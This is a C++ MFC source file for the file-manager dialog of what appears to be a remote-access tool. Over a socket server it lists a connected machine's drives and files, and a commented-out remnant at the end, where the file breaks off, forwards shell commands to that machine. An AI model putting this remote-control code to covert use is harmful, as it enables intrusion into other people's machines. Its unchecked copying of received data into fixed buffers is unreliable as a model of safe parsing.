// FileManagerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "FileManagerDlg.h"
#include "afxdialogex.h"



// CFileManagerDlg 对话框
static UINT __Indicators[] =
{
	ID_SEPARATOR,
	IDR_STATUSBAR_PROGRESS,
	ID_SEPARATOR,
	
};

IMPLEMENT_DYNAMIC(CFileManagerDlg, CDialog)

CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer*
	IOCPServer, CONTEXT_OBJECT* ContextObject, ULONG RunMode)
	: CDialog(IDD_DIALOG_FILE_MANAGER, pParent)
{
	m_RunMode = RunMode;
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));


	SHFILEINFO	sfi;
	HIMAGELIST ImageListHwnd;			
									//加载系统图标列表
	ImageListHwnd = (HIMAGELIST)SHGetFileInfo(NULL, 0,
		&sfi, sizeof(SHFILEINFO), SHGFI_LARGEICON | SHGFI_SYSICONINDEX);
	m_CImageList_Large = CImageList::FromHandle(ImageListHwnd);   //CimageList*
																  //加载系统图标列表
	ImageListHwnd = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi, 
		sizeof(SHFILEINFO), SHGFI_SMALLICON | SHGFI_SYSICONINDEX);
	m_CImageList_Small = CImageList::FromHandle(ImageListHwnd);

	m_FileModuleBase = LoadLibrary("File.dll");
	m_GetLocalHardDiskInfo = (LPFN_GETLOCALHARDDISKINFO)GetProcAddress(m_FileModuleBase,
		"GetLocalHardDiskInfo");

}

CFileManagerDlg::~CFileManagerDlg()
{
	if (m_FileModuleBase != NULL)
	{
		FreeLibrary(m_FileModuleBase);
		m_FileModuleBase = NULL;

	}
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_SERVER_FILE, m_CListCtrl_Server_File);
	DDX_Control(pDX, IDC_LIST_CLIENT_FILE, m_CListCtrl_Client_File);
	DDX_Control(pDX, IDC_STATIC_SERVER_FILE, m_ServerFileBarPos);
	DDX_Control(pDX, IDC_STATIC_CLIENT_FILE, m_ClientFileBarPos);
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialog)
	ON_WM_CLOSE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_SERVER_FILE, &CFileManagerDlg::OnNMDblclkListServerFile)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_CLIENT_FILE, &CFileManagerDlg::OnNMDblclkListClientFile)
END_MESSAGE_MAP()

// CFileManagerDlg 消息处理程序
BOOL CFileManagerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetIcon(m_IconHwnd, FALSE);   //设置忍者图标到Dialog
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);

	BOOL IsOk = INVALID_SOCKET;
	if (m_ContextObject != NULL)
	{
		IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	}
	v1.Format("%s - 文件管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "本地");
	SetWindowText(v1);//设置对话框标题



	DWORD WindowWidth  = 0;
	DWORD WindowHeight = 0;

	switch (m_RunMode)
	{
	//Servrt Client
	case  FILE_MANAGER::CLIENT_MODE:
	{

		CString v1;
		sockaddr_in  ClientAddress;
		memset(&ClientAddress, 0, sizeof(ClientAddress));
		int ClientAddressLength = sizeof(ClientAddress);

		BOOL IsOk = INVALID_SOCKET;
		if (m_ContextObject != NULL)
		{
			IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
		}
		v1.Format("%s - 文件管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "本地");
		SetWindowText(v1);//设置对话框标题

		//创建真彩Button
		if (!m_ToolBar_Server_File.Create(this, WS_CHILD |
			WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, IDR_TOOLBAR_SERVER_FILE)
			|| !m_ToolBar_Server_File.LoadToolBar(IDR_TOOLBAR_SERVER_FILE))
		{

			return -1;
		}
		m_ToolBar_Server_File.LoadTrueColorToolBar
		(
			24,   
			IDB_BITMAP_FILE_MAIN,
			IDB_BITMAP_FILE_MAIN,
			IDB_BITMAP_FILE_MAIN   
		);

		m_ToolBar_Server_File.AddDropDownButton(this, IDT_SERVER_FILE_VIEW, IDT_SERVER_FILE_VIEW);
		m_ToolBar_Server_File.SetButtonText(0, "Previous");    
		m_ToolBar_Server_File.SetButtonText(1, "View");
		m_ToolBar_Server_File.SetButtonText(2, "Delete");
		m_ToolBar_Server_File.SetButtonText(3, "New");
		m_ToolBar_Server_File.SetButtonText(4, "查找");
		m_ToolBar_Server_File.SetButtonText(5, "停止");
		RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  
		RECT ServerRect;
		m_ServerFileBarPos.GetWindowRect(&ServerRect);
		m_ServerFileBarPos.ShowWindow(SW_HIDE);
		ServerRect.left -= 3;
		m_ToolBar_Server_File.MoveWindow(&ServerRect);
		
		
		m_CListCtrl_Server_File.SetImageList(m_CImageList_Large, LVSIL_NORMAL);
		m_CListCtrl_Server_File.SetImageList(m_CImageList_Small, LVSIL_SMALL);
		
		GetClientRect(&ServerRect);
		CRect v3;
		v3.top = ServerRect.bottom - 25;
		v3.bottom = ServerRect.bottom;
		m_CListCtrl_Server_File.GetWindowRect(&ServerRect);
		v3.left = ServerRect.left-8;
		v3.right = ServerRect.right-8;
		
		if (!m_StatusBar_File.Create(this) ||
			!m_StatusBar_File.SetIndicators(__Indicators,
				sizeof(__Indicators) / sizeof(UINT)))
		{
			return -1;
		}
		m_StatusBar_File.SetPaneInfo(0, m_StatusBar_File.GetItemID(0), SBPS_STRETCH, NULL);
		m_StatusBar_File.SetPaneInfo(1, m_StatusBar_File.GetItemID(1), SBPS_NORMAL, 120);
		m_StatusBar_File.SetPaneInfo(2, m_StatusBar_File.GetItemID(2), SBPS_NORMAL, 50);
		RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); 

		m_StatusBar_File.MoveWindow(v3);

		m_StatusBar_File.GetItemRect(1, &ServerRect);
		ServerRect.bottom -= 1;
		m_ProgressCtrl_File = new CProgressCtrl;
		m_ProgressCtrl_File->Create(PBS_SMOOTH | WS_VISIBLE, ServerRect, &m_StatusBar_File, 1);
		m_ProgressCtrl_File->SetRange(0, 100);          
		m_ProgressCtrl_File->SetPos(0);
		//客户端
		
		if (!m_ToolBar_Client_File.Create(this, WS_CHILD |
			WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, IDR_TOOLBAR_SERVER_FILE)
			|| !m_ToolBar_Client_File.LoadToolBar(IDR_TOOLBAR_SERVER_FILE))
		{

			return -1;
		}
		m_ToolBar_Client_File.LoadTrueColorToolBar
		(
			24,
			IDB_BITMAP_FILE_MAIN,
			IDB_BITMAP_FILE_MAIN,
			IDB_BITMAP_FILE_MAIN
		);

		m_ToolBar_Client_File.AddDropDownButton(this, IDT_SERVER_FILE_VIEW, IDT_SERVER_FILE_VIEW);
		m_ToolBar_Client_File.SetButtonText(0, "Previous");
		m_ToolBar_Client_File.SetButtonText(1, "View");
		m_ToolBar_Client_File.SetButtonText(2, "Delete");
		m_ToolBar_Client_File.SetButtonText(3, "New");
		m_ToolBar_Client_File.SetButtonText(4, "查找");
		m_ToolBar_Client_File.SetButtonText(5, "停止");
		RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);
		RECT ClientRect;
		m_ClientFileBarPos.GetWindowRect(&ClientRect);
		m_ClientFileBarPos.ShowWindow(SW_HIDE);
		ClientRect.right += 3;
		m_ToolBar_Client_File.MoveWindow(&ClientRect);

		m_CListCtrl_Client_File.SetImageList(m_CImageList_Large, LVSIL_NORMAL);
		m_CListCtrl_Client_File.SetImageList(m_CImageList_Small, LVSIL_SMALL);

		FixedServerFileInfo();
		FixedClientFileInfo(m_ContextObject->m_InDeCompressedBufferData.GetArray(1), 
			m_ContextObject->m_InDeCompressedBufferData.GetArrayLength() - 1);
		break;
	}
	//Server
	case FILE_MANAGER::SERVER_MODE:
	{

	/*	RECT Rect;
		GetWindowRect(&Rect);  //当前Dialog大小
		WindowWidth = Rect.right / 2;
		SetWindowPos(NULL, 0, 0,WindowWidth , Rect.bottom, SWP_NOMOVE);
		if (!m_StatusBar_File_Server.Create(this) ||
			!m_StatusBar_File_Server.SetIndicators(__Indicators,
				sizeof(__Indicators) / sizeof(UINT)))
		{
			return -1;
		}
		CRect v1;
		m_CListCtrl_File_Server.GetWindowRect(&Rect);		
		v1.bottom = Rect.bottom - 8;
		v1.left   = Rect.left-8;
		v1.right  = Rect.right-8;
		v1.top    = v1.bottom - 20;
		m_StatusBar_File_Server.SetPaneInfo(0, m_StatusBar_File_Server.GetItemID(0), SBPS_STRETCH, NULL);
		m_StatusBar_File_Server.SetPaneInfo(1, m_StatusBar_File_Server.GetItemID(1), SBPS_NORMAL, WindowWidth /7);
		m_StatusBar_File_Server.SetPaneInfo(2, m_StatusBar_File_Server.GetItemID(2), SBPS_NORMAL, WindowWidth / 3);
		RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏
		m_StatusBar_File_Server.MoveWindow(v1);
		m_ProgressCtrl_File_Server = new CProgressCtrl;
		m_StatusBar_File_Server.GetItemRect(2, &Rect);
		m_ProgressCtrl_File_Server->Create(PBS_SMOOTH | WS_VISIBLE, Rect, &m_StatusBar_File_Server, 2);


		//ControlList
		m_CListCtrl_File_Server.SetImageList(m_CImageList_Large, LVSIL_NORMAL);
		m_CListCtrl_File_Server.SetImageList(m_CImageList_Small, LVSIL_SMALL);
	
		InitServerUSN();*/
		break;
	}
	default:
		break;
	}
	

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}
void CFileManagerDlg::OnReceiveComplete(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	switch (m_ContextObject->m_InDeCompressedBufferData.GetArray()[0])
	{
	case CLIENT_FILE_MANAGER_REPLY:
	{
		FixedClientFileInfo((m_ContextObject->m_InDeCompressedBufferData.GetArray(1)),
			m_ContextObject->m_InDeCompressedBufferData.GetArrayLength() - 1);
		break;
	}
	case CLIENT_FILE_LIST_REPLY:
	{

		FixedClientFileList(m_ContextObject->m_InDeCompressedBufferData.GetArray(),
			m_ContextObject->m_InDeCompressedBufferData.GetArrayLength() - 1);
		break;
	}
	}
}
void CFileManagerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_ContextObject != NULL)
	{
		CancelIo((HANDLE)m_ContextObject->ClientSocket);
		closesocket(m_ContextObject->ClientSocket);
		//这个太重要了
		m_ContextObject->DlgHandle = NULL;
		m_ContextObject->DlgID = 0;
	}
	CDialog::OnClose();
}
VOID CFileManagerDlg::FixedServerFileInfo()
{


	m_CListCtrl_Server_File.DeleteAllItems();
	while (m_CListCtrl_Server_File.DeleteColumn(0) != 0);
	//初始化列表信息
	m_CListCtrl_Server_File.InsertColumn(0, "名称", LVCFMT_LEFT, 40);
	m_CListCtrl_Server_File.InsertColumn(1, "显示名称", LVCFMT_LEFT, 70);
	m_CListCtrl_Server_File.InsertColumn(2, "文件系统", LVCFMT_LEFT, 55);
	m_CListCtrl_Server_File.InsertColumn(3, "类型", LVCFMT_LEFT, 45);
	m_CListCtrl_Server_File.InsertColumn(4, "总大小", LVCFMT_LEFT, 80);
	m_CListCtrl_Server_File.InsertColumn(5, "可用空间", LVCFMT_LEFT, 80);
	m_CListCtrl_Server_File.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	
	if (m_GetLocalHardDiskInfo==NULL)
	{
		return;
	}

	vector<_HARD_DISK_INFORMATION_> HardDiskInfo;
	m_GetLocalHardDiskInfo(HardDiskInfo);

	vector<_HARD_DISK_INFORMATION_>::iterator i = HardDiskInfo.begin();
	int j = 0;
	while (j!=HardDiskInfo.size())
	{
		int	Item = m_CListCtrl_Server_File.InsertItem(j, &((*i).HardDiskName[0]), 
			i->HardDiskIcon);    //获得系统的图标		
		m_CListCtrl_Server_File.SetItemText(Item, 1, i->DisplayName);
		m_CListCtrl_Server_File.SetItemText(Item, 2, i->FileSystem);
		m_CListCtrl_Server_File.SetItemText(Item, 3, i->HardDiskType);
		CString	v1;
		v1.Format("%10.1f GB", (float)i->HardDiskAmountMB / 1024);
		m_CListCtrl_Server_File.SetItemText(Item, 4, v1);
		v1.Format("%10.1f GB", (float)i->HardDiskFreeSpaceMB / 1024);
		m_CListCtrl_Server_File.SetItemText(Item, 5, v1);
	
		if (i->IsDirectory)
		{
			m_CListCtrl_Server_File.SetItemData(Item, 1);
		}
		i++;
		j++;

	}
}
VOID CFileManagerDlg::FixedClientFileInfo(BYTE* BufferData,ULONG BufferLength)
{

	if (BufferData==NULL||BufferLength==0)
	{
		return;
	}

	m_CListCtrl_Client_File.DeleteAllItems();
	while (m_CListCtrl_Client_File.DeleteColumn(0) != 0);
	//初始化列表信息
	m_CListCtrl_Client_File.InsertColumn(0, "名称", LVCFMT_LEFT, 40);
	m_CListCtrl_Client_File.InsertColumn(1, "显示名称", LVCFMT_LEFT, 70);
	m_CListCtrl_Client_File.InsertColumn(2, "文件系统", LVCFMT_LEFT, 55);
	m_CListCtrl_Client_File.InsertColumn(3, "类型", LVCFMT_LEFT, 45);
	m_CListCtrl_Client_File.InsertColumn(4, "总大小", LVCFMT_LEFT, 80);
	m_CListCtrl_Client_File.InsertColumn(5, "可用空间", LVCFMT_LEFT, 80);
	m_CListCtrl_Client_File.SetExtendedStyle(LVS_EX_FULLROWSELECT);


	char	*Travel = NULL;
	Travel = (char *)BufferData;   //已经去掉了消息头的1个字节了


	int i = 0;
	int j = 0;
	char                DisplayName[MAX_PATH];
	float		        HardDiskAmountMB = 0; 
	float		        HardDiskFreeSpaceMB = 0;  
	BOOL                IsDirectory = FALSE;
	char                HardDiskName[2] = {0};
	char                FileSystem[MAX_PATH + 1];
	char                HardDiskType[80];
	DWORD               HardDiskIcon = 0;
	while (Travel[j]!='\0')
	{
		memcpy(HardDiskName, &Travel[j], 2);
		j += 2;
		memcpy(DisplayName, &Travel[j], strlen(&Travel[j]) + 1);
		j += strlen(&Travel[j]) + 1;


		memcpy(&HardDiskIcon, &Travel[j], sizeof(DWORD));
		j += sizeof(DWORD);

		memcpy(&IsDirectory,  &Travel[j], sizeof(BOOL));
		j += sizeof(BOOL);

		memcpy(FileSystem, &Travel[j], lstrlen(&Travel[j]) + 1);
		j +=  lstrlen(&Travel[j]) + 1;

		memcpy(HardDiskType, &Travel[j], lstrlen(&Travel[j]) + 1);
		j += lstrlen(&Travel[j]) + 1;

		memcpy(&HardDiskAmountMB, &Travel[j], sizeof(float));
		j += sizeof(float);

		memcpy(&HardDiskFreeSpaceMB,  &Travel[j], sizeof(float));
		j += sizeof(float);


		int	Item = m_CListCtrl_Client_File.InsertItem(i,HardDiskName,
			HardDiskIcon);    //获得系统的图标	
		m_CListCtrl_Client_File.SetItemText(Item, 1,DisplayName);
		m_CListCtrl_Client_File.SetItemText(Item, 2,FileSystem);
		m_CListCtrl_Client_File.SetItemText(Item, 3,HardDiskType);


		CString	v1;
		v1.Format("%10.1f GB", HardDiskAmountMB / 1024);
		m_CListCtrl_Client_File.SetItemText(Item, 4, v1);
		
		v1.Format("%10.1f GB", HardDiskFreeSpaceMB / 1024);
		m_CListCtrl_Client_File.SetItemText(Item, 5, v1);

		if (IsDirectory)
		{
			m_CListCtrl_Client_File.SetItemData(Item, 1);
		}
		i++;
	}
}
void CFileManagerDlg::OnNMDblclkListServerFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码

	if (m_CListCtrl_Server_File.GetSelectedCount() == 0 ||
		m_CListCtrl_Server_File.GetItemData(m_CListCtrl_Server_File.GetSelectionMark()) != 1)
		return;

	switch (m_RunMode)
	{
	case FILE_MANAGER::SERVER_MODE:
	{
		FixedServerFileInfoUSN();
		break;
	}
	case FILE_MANAGER::CLIENT_MODE:
	{


		break;
	}
	default:
		break;
	}



	*pResult = 0;
}
void CFileManagerDlg::OnNMDblclkListClientFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码


	if (m_CListCtrl_Client_File.GetSelectedCount() == 0 ||
		m_CListCtrl_Client_File.GetItemData(m_CListCtrl_Client_File.GetSelectionMark()) != 1)
	{
		return;
	}



	GetClientFileInfo();  //发消息

	*pResult = 0;
}
VOID CFileManagerDlg::GetClientFileInfo(CString DirectoryPathData)
{
	if (DirectoryPathData.GetLength() == 0)   
	{
		int	Item = m_CListCtrl_Client_File.GetSelectionMark();

		// 如果有选中的，是目录
		if (Item != -1)
		{
			if (m_CListCtrl_Client_File.GetItemData(Item) == 1)
			{
				DirectoryPathData = m_CListCtrl_Client_File.GetItemText(Item, 0);    /* D:\ */
			}
		}
		// 从组合框里得到路径
		else
		{
			//	m_Remote_Directory_ComboBox.GetWindowText(m_File_Client_Path);
		}
	}

	if (DirectoryPathData == "..")
	{
		 GetParentDirectory(m_ClientFilePath,m_ClientFilePath);
	}

	else if (DirectoryPathData != ".")
	{
		m_ClientFilePath += DirectoryPathData;
		if (m_ClientFilePath.Right(1) != "\\")
		{
			if (m_ClientFilePath.GetLength()==1)
			{
				m_ClientFilePath += ":\\";
			}
			else
			{
				m_ClientFilePath += "\\";
			}
			
		}
	
	}


	if (m_ClientFilePath.GetLength() == 0)
	{
		//刷新卷
		char IsToken = CLIENT_FILE_MANAGER_REQUIRE;
		m_IOCPServer->OnClientPreSending(m_ContextObject, (PBYTE)&IsToken, 1);
		return;
	}


	ULONG	BufferLength = m_ClientFilePath.GetLength() + 2;
	BYTE*   BufferData = (BYTE *)new BYTE[BufferLength];
	//将COMMAND_LIST_FILES  发送到控制端，到控制搜索
	BufferData[0] = CLIENT_FILE_LIST_REQUIRE;
	memcpy(BufferData + 1, m_ClientFilePath.GetBuffer(0), BufferLength - 1);
	m_IOCPServer->OnClientPreSending(m_ContextObject, BufferData, BufferLength);
	delete[] BufferData;
	BufferData = NULL;

	//	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
	//	m_Remote_Directory_ComboBox.SetCurSel(0);
	// 得到返回数据前禁窗口
	m_CListCtrl_Client_File.EnableWindow(FALSE);        //不能瞎点
	m_ProgressCtrl_File->SetPos(0);                     //初始化进度条


}
VOID CFileManagerDlg::FixedClientFileList(BYTE *BufferData, ULONG BufferLength)
{
	
	SHFILEINFO	ShFileInfo;
	//	HIMAGELIST hImageListLarge = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_LARGEICON);
	//	HIMAGELIST hImageListSmall = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
	//	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	//	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);  //??

	// 重建标题
	m_CListCtrl_Client_File.DeleteAllItems();
	while (m_CListCtrl_Client_File.DeleteColumn(0) != 0);
	m_CListCtrl_Client_File.InsertColumn(0, "名称", LVCFMT_LEFT, 200);
	m_CListCtrl_Client_File.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_CListCtrl_Client_File.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
	m_CListCtrl_Client_File.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);
	int	v10 = 0;
	m_CListCtrl_Client_File.SetItemData(m_CListCtrl_Client_File.
		InsertItem(v10++, "..", GetServerIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)), 1);
	if (BufferLength != 0)
	{
		//D:\                  [1][][1][][1][][][][][][]
		// 遍历发送来的数据显示到列表中
		for (int i = 0; i < 2; i++)
		{
			// 跳过Token   	//[Flag 1 HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
			char *Travel = (char *)(BufferData + 1);
			//[1 HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
			for (char *v1 = Travel; Travel - v1 < BufferLength - 1;)
			{
				
				char	*FileName = NULL;
				DWORD	FileSizeHigh = 0; // 文件高字节大小
				DWORD	FileSizeLow = 0;  // 文件低字节大小
				int		Item = 0;
				bool	IsInsert = false;
				FILETIME LastWriteTime;

				int	IsDirectory = *Travel ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				// i 为 0 时，列目录，i为1时列文件
				IsInsert = !(IsDirectory == FILE_ATTRIBUTE_DIRECTORY) == i;

				//0==1     0==0   !1  0

				////[HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
				FileName = ++Travel;

				if (IsInsert)
				{
					Item = m_CListCtrl_Client_File.InsertItem(v10++,
						FileName, GetServerIconIndex(FileName, IsDirectory));
					m_CListCtrl_Client_File.SetItemData(Item, IsDirectory == FILE_ATTRIBUTE_DIRECTORY);   //隐藏属性
					SHFILEINFO	ShFileInfo;
					SHGetFileInfo(FileName, FILE_ATTRIBUTE_NORMAL | IsDirectory,
						&ShFileInfo, sizeof(SHFILEINFO),
						SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
					m_CListCtrl_Client_File.SetItemText(Item, 2, ShFileInfo.szTypeName);
				}
				// 得到文件大小
				Travel += strlen(FileName) + 1;
				if (IsInsert)
				{
					memcpy(&FileSizeHigh, Travel, 4);
					memcpy(&FileSizeLow, Travel + 4, 4);
					CString v7;
					v7.Format("%10d KB", (FileSizeHigh * (MAXDWORD + 1)) / 1024 + FileSizeLow / 1024 + (FileSizeLow % 1024 ? 1 : 0));
					m_CListCtrl_Client_File.SetItemText(Item, 1, v7);
					memcpy(&LastWriteTime, Travel + 8, sizeof(FILETIME));
					CTime	Time(LastWriteTime);
					m_CListCtrl_Client_File.SetItemText(Item, 3, Time.Format("%Y-%m-%d %H:%M"));
				}
				Travel += 16;
			}
		}
	}

	// 恢复窗口
	m_CListCtrl_Client_File.EnableWindow(TRUE);
}
int	CFileManagerDlg::GetServerIconIndex(LPCTSTR FileFullPathData, DWORD FileAttributes)  //文件 文件夹
{

	
	SHFILEINFO	ShFileInfo;
	if (FileAttributes == INVALID_FILE_ATTRIBUTES)
		FileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		FileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
	(
		FileFullPathData,
		FileAttributes,
		&ShFileInfo,
		sizeof(SHFILEINFO),
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
	);

	return ShFileInfo.iIcon;
}

/************************************************************************/
/*                                                                      */
/************************************************************************/
BOOL CFileManagerDlg::InitServerUSN()
{
	// 将整个窗口Disable
	this->EnableWindow(FALSE);
	int Count = 0;

	// 找到所有盘符
	CHAR  VolumeName[] = "A:\\";
	CString FileSystem;

	while (VolumeName[0] <= 'Z')
	{
		// 判断当前盘符是不是NTFS盘
		if (GetVolumeFileSystem(VolumeName, FileSystem) == FALSE)
		{
			VolumeName[0]++;
			continue;
		}
		if (_stricmp(FileSystem.GetBuffer(0), "NTFS") == 0)	// NTFS系统 -
		{
			// 构造 CVolume 类，压入容器
			m_Volumes.push_back(_CVolume(VolumeName[0]));
			Count++;
		}
		VolumeName[0]++;
	}
	m_ProgressCtrl_File->SetRange(0, Count * 100);
	m_ProgressCtrl_File->SetPos(0);
	AfxBeginThread(ThreadProcedure, (LPVOID)this);
	return TRUE;
}
UINT CFileManagerDlg::ThreadProcedure(LPVOID ParameterData)
{
	CFileManagerDlg* This = (CFileManagerDlg*)ParameterData;
	if (This != nullptr)
	{
		return This->RealThreadProcedure(NULL);
	}
	return 0;
}
UINT CFileManagerDlg::RealThreadProcedure(LPVOID ParameterData)
{
	int Count = 0;
	for (vector<_CVolume>::iterator i = m_Volumes.begin(); i != m_Volumes.end(); i++)
	{
		m_StatusBar_File.SetWindowText("正在初始化 " + CString(i->m_VolumeValue) + ":\\");
		// 每个盘符类初始化自己的MAP
		i->InitVolumeUSN();
		m_ProgressCtrl_File->SetPos((Count + 1) * 100);
		// 各自启动守候线程 
		m_MonitorThreadHandle[Count] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorProcedure, (PVOID)&(*i), 0, 0);
		if (m_MonitorThreadHandle[Count] == NULL)
		{
			MessageBox("Start Monitor Thrad Failed");
		}
		Count++;
	}
	this->EnableWindow();
	FixedServerVolumeInfo();
	m_StatusBar_File.SetWindowText("初始化完成");
	m_ProgressCtrl_File->SetPos(0);
	return true;
}
DWORD MonitorProcedure(LPVOID ParameterData)
{
	const DWORD MonitorUSNReason = USN_REASON_FILE_CREATE | USN_REASON_FILE_DELETE | 
		USN_REASON_RENAME_OLD_NAME | USN_REASON_RENAME_NEW_NAME;
	
	_CVolume* This = (_CVolume*)ParameterData;  //Char Map
	BOOL IsOk = FALSE;
	DWORD ReturnLength = 0;

	// 打开磁盘
	CHAR   DiskVolumeName[] = "\\\\.\\A:";
	DiskVolumeName[4] = This->m_VolumeValue;
	
	HANDLE DiskVolumeHandle = CreateFileA(DiskVolumeName, GENERIC_READ | 
		GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
	if (DiskVolumeHandle == INVALID_HANDLE_VALUE)
	{
		return -1;
	}

	// 得到USN_DATA 得到上一次遍历的最后结果
	USN_JOURNAL_DATA_V0  USNJournalData = { 0 };
	IsOk = DeviceIoControl(DiskVolumeHandle, 
		FSCTL_QUERY_USN_JOURNAL, nullptr, 0, &USNJournalData, sizeof(USN_JOURNAL_DATA_V0), &ReturnLength,
		NULL);
	if (!IsOk)
	{
		return -1;
	}
	// 构造监视结构体 - 关键是监视类型 
	READ_USN_JOURNAL_DATA_V0 ReadUSNJournalData = { 0 };
	ReadUSNJournalData.BytesToWaitFor = 0;
	ReadUSNJournalData.ReasonMask = MonitorUSNReason;
	ReadUSNJournalData.ReturnOnlyOnClose = 0;
	ReadUSNJournalData.StartUsn = USNJournalData.NextUsn;
	ReadUSNJournalData.Timeout = 0;
	ReadUSNJournalData.UsnJournalID = USNJournalData.UsnJournalID;
	
	
	
	BYTE BufferData[USN_PAGE_SIZE] = { 0 };
	PUSN_RECORD_V2 USNRecordData = NULL;
	DWORD USNRecordLength = 0;
	while (true)
	{
		//Sleep(rand() % 1000 + 1000);
		// 阻塞函数 - 监视到新的USN才会返回
		IsOk = DeviceIoControl(DiskVolumeHandle, FSCTL_READ_USN_JOURNAL, &ReadUSNJournalData, sizeof(READ_USN_JOURNAL_DATA_V0),
			BufferData, USN_PAGE_SIZE, &ReturnLength, NULL);
		if (!IsOk)
		{
			return -1;
		}
		// 返回数据结构: USN + n个USN_RECORD
		if (ReturnLength < sizeof(USN))
			continue;

		USNRecordLength = ReturnLength - sizeof(USN);
		USNRecordData = (PUSN_RECORD)(BufferData + sizeof(USN));
		
		This->m_CriticalSection.Lock();
		while (USNRecordLength > 0)
		{
		
			//修改数据结构
			This->ChangeFileMap(USNRecordData->FileAttributes, USNRecordData->FileReferenceNumber, 
				USNRecordData->Reason, USNRecordData->ParentFileReferenceNumber,
				PWCHAR(USNRecordData->FileName), USNRecordData->FileNameLength);
			USNRecordLength -= USNRecordData->RecordLength;
			USNRecordData = (PUSN_RECORD)(((PBYTE)USNRecordData) + USNRecordData->RecordLength);
		}
		This->m_CriticalSection.Unlock();
		ReadUSNJournalData.StartUsn = *(USN*)BufferData;
	}



	return 0;
}
BOOL CFileManagerDlg::GetVolumeFileSystem(CHAR * VolumeName, CString& FileSystem)
{
	CHAR v1[MAX_PATH] = { 0 };
	BOOL IsOk = GetVolumeInformationA(VolumeName, NULL, 0, NULL, NULL, NULL, v1, MAX_PATH);
	if (IsOk == TRUE)
	{
		FileSystem = v1;   //动态内存
	}
	return IsOk;
}
BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg)
{

	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;
		//如果是可编辑框的回车键
	/*	if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_CEdit_Cmd_Main.m_hWnd)
		{
			//得到窗口的数据大小
			int	BufferLength = m_CEdit_Cmd_Main.GetWindowTextLength();  //C:\>dir
			CString BufferData;
			//得到窗口的字符数据
			m_CEdit_Cmd_Main.GetWindowText(BufferData);//dir\r\n  
									  //加入换行符
			BufferData += "\r\n";
			//得到整个的缓冲区的首地址再加上原有的字符的位置，其实就是用户当前输入的数据了
			//然后将数据发送出去。。。。。。。。。。。。。。。
			m_IOCPServer->OnClientPreSending(m_ContextObject, (LPBYTE)BufferData.GetBuffer(0) + m_911,
				BufferData.GetLength() - m_911);
